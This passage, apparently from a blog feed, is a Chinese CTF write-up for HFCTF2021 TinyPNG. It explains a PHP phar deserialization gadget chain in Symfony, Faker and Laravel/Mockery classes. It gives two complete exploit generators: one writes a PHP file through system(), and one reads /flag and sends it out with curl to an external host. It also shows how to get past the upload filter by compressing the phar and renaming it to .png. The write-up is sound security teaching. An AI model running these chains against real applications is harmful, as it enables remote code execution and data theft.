comment"># vendor/fakephp/faker/src/Faker/DefaultGenerator.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$default</span><span class="token punctuation">;</span><span class="token comment">//...</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的 <code>__call</code> 方法会返回一个我们完全可控的 <code>$this-&gt;default</code></p><p>于是到这里，<code>ValidGenerator</code> 中的 <code>$res</code> 参数就是我们可以控制的了</p><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>梳理一下调用链</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ImportConfigurator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">-></span><span class="token function">addCollection</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">route</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ValidGenerator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">generator</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>OverflowException</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Maximum retries of %d reached without finding a valid value'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">validator</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1、通过 <code>ImportConfigurator</code> 类的 <code>__destruct</code> 方法触发 <code>ValidGenerator</code> 类的 <code>__call</code> 方法</p><p>2、<code>ValidGenerator</code> 类的 <code>__call</code> 方法中的 <code>call_user_func_array</code> 函数</p><p>3、触发 <code>DefaultGenerator</code> 类的 <code>__call</code> 方法</p><p>4、<code>DefaultGenerator</code> 类的 <code>__call</code> 方法返回值完全可控</p><p>5、<code>ValidGenerator</code> 类的 <code>__call</code> 方法中的 <code>call_user_func_array</code> 函数返回值 <code>$res</code> 可控</p><p>6、<code>ValidGenerator</code> 类的 <code>__call</code> 方法中 <code>call_user_func</code> 函数的两个参数都可控</p><p>条件梳理</p><ul><li><code>ImportConfigurator-&gt;parent</code> = <code>ValidGenerator 类</code></li><li><code>ValidGenerator-&gt;maxRetries</code> = <code>1</code></li><li><code>ValidGenerator-&gt;generator</code> = <code>DefaultGenerator 类</code></li><li><code>DefaultGenerator-&gt;default</code> = <code>[任意可控函数参数]</code></li><li><code>ValidGenerator-&gt;validator</code> = <code>[任意可控函数名称]</code></li></ul><h3 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar 反序列化"></a>phar 反序列化</h3><p>phar 反序列化是 BlackHat 2018 公布的一种不需要 <code>unserialize</code> 函数就能触发反序列化的方法</p><p>因为百度出来的复制来复制去都是那几篇文章，这里附一份 <a href="https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf">BlackHat 2018 的讲义</a></p><p>PHAR 文件是 PHP Archieve 的缩写，也就是类似于 Java 的 JAR 包的一种压缩文件</p><p><img src="image-20210430120902.png" alt="image-20210430120902" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430120902.png" class="lozad post-image"></p><p>PHP 在读取 PHAR 文件的时候会对 <code>.phar/.metadata.bin</code> 中的内容进行反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># exp1.phar.tar.gz/.phar/.metadata.binO:64:"Symfony\Component\Routing\Loader\Configurator\ImportConfigurator":1:&#123;s:72:" Symfony\Component\Routing\Loader\Configurator\ImportConfigurator parent";O:20:"Faker\ValidGenerator":3:&#123;s:12:" * generator";O:22:"Faker\DefaultGenerator":1:&#123;s:10:" * default";s:34:"echo "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>" > 1.php";&#125;s:12:" * validator";s:6:"system";s:13:" * maxRetries";i:1;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>而 <code>.phar/stub.php</code> 是 PHAR 文件的一个标志，即 <code>__HALT_COMPILER(); ?&gt;</code></p><p><img src="image-20210430121227.png" alt="image-20210430121227" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430121227.png" class="lozad post-image"></p><p>PHP 不会理会这个标志前面是什么东西，他只管把这个标志后面的部分作为 PHAR 包来解析</p><p><code>test.txt</code> 是随便一个什么东西，是一个为了完成压缩而随意构造的东西，PHAR 反序列化的重点也不在这里 2333</p><p>因此只要 PHP 能以 <code>phar://</code> 协议读取这个文件，我们的目的就达到了</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Routing<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>Configurator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">ImportConfigurator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$c1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span> <span class="token operator">=</span> <span class="token variable">$c1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">ValidGenerator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$generator</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$validator</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$maxRetries</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">generator</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">validator</span> <span class="token operator">=</span> <span class="token variable">$func</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exp1.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">convertToExecutable</span><span class="token punctuation">(</span><span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">TAR</span><span class="token punctuation">,</span> <span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">GZ</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Routing<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>Configurator<span class="token punctuation">\</span>ImportConfigurator</span><span class="token punctuation">(</span>        <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Faker<span class="token punctuation">\</span>ValidGenerator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'echo "&lt;?php phpinfo(); ?>" > 1.php'</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为上传文件有对 stub 和 php 的过滤，加一行语句压缩一下就能过</p><p>压缩后的文件内容</p><p><img src="image-20210430121617.png" alt="image-20210430121617" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430121617.png" class="lozad post-image"></p><p>足够抽象了吧 233</p><p>生成出来的 <code>exp1.phar.tar.gz</code>，改名为 <code>exp1.png</code></p><p><strong>P.S. 因为 PHP 8 在遇到异常的时候会作为错误处理，停止执行代码</strong></p><p><strong>所以如果题目环境是 PHP 8 好像是打不通的 (我是 Manjaro 神教，被坑了不短时间 2333)</strong></p><p><img src="image-20210429190751.png" alt="image-20210429190751" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190751.png" class="lozad post-image"></p><p>上传文件，然后访问路由 <code>/index.php/image?image=phar://./uploads/xxxxxxx.png</code></p><p><img src="image-20210429190759.png" alt="image-20210429190759" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190759.png" class="lozad post-image"></p><p><img src="image-20210429190813.png" alt="image-20210429190813" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190813.png" class="lozad post-image"></p><p>会返回 500 错误，我开了 Laravel DEBUG 所以页面上有详细信息</p><p>但是 phar 反序列化已经执行了，所以会在 <code>public</code> 目录生成一个 <code>1.php</code></p><p><img src="image-20210429190820.png" alt="image-20210429190820" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190820.png" class="lozad post-image"></p><p>访问 <code>/1.php</code> 即可</p><h3 id="官方版本-EXP"><a href="#官方版本-EXP" class="headerlink" title="官方版本 EXP"></a>官方版本 EXP</h3><p>参考了 ZeddYu 师傅的推文。</p><p>本地环境和 Buu 远程环境不太一样，我的 EXP 好像没打通，官方解用了另一条链。</p><p>有兴趣的师傅可以跟一下这条链。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Dispatcher</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">queueResolver</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Mockery<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>EvalLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'load'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BroadcastEvent</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BroadcastEvent</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">connection</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Mockery<span class="token punctuation">\</span>Generator<span class="token punctuation">\</span>MockDefinition</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Support</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MessageBag</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$messages</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$inner</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token variable">$inner</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Loader</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">EvalLoader</span>    <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockDefinition</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$evilCode</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MockConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockConfiguration</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefg'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php $s=base64_encode(file_get_contents("/flag"));system("curl http://xx.xx.xx.xx:5555/?a=".$s);exit; ?>'</span><span class="token punctuation">;</span>    <span class="token variable">$expected</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Support<span class="token punctuation">\</span>MessageBag</span><span class="token punctuation">(</span><span class="token variable">$expected</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp2.phar.tar.gz"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">convertToExecutable</span><span class="token punctuation">(</span><span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">TAR</span><span class="token punctuation">,</span> <span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">GZ</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HTTP2-走私"><a href="#HTTP2-走私" class="headerlink" title="HTTP2 走私"></a>HTTP2 走私</h3><p>原来 <code>/index.php/image</code> 真的是非预期。</p><p>ZeddYu 师傅的推文里有提到 HTTP2 走私才是预期解。</p><p>我这里贴一下 4qE 发给我的文章：<a href="https://www.anquanke.com/post/id/237140">BlackHat：HTTP 请求走私的新变体、新防御</a></p><p>等我把走私复现了再更新博客 233</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;HFCTF2021-TinyPNG&quot;&gt;&lt;a href=&quot;#HFCTF2021-TinyPNG&quot; class=&quot;headerlink&quot; title=&quot;HFCTF2021 TinyPNG&quot;&gt;&lt;/a&gt;HFCTF2021 TinyPNG&lt;/h2&gt;&lt;p&gt;感谢 Naiveku</summary>
      
    
    
    
    
    <category term="CTF WriteUp" scheme="https://me.liki.link/tags/CTF-WriteUp/"/>
    
  </entry>
  
</feed>
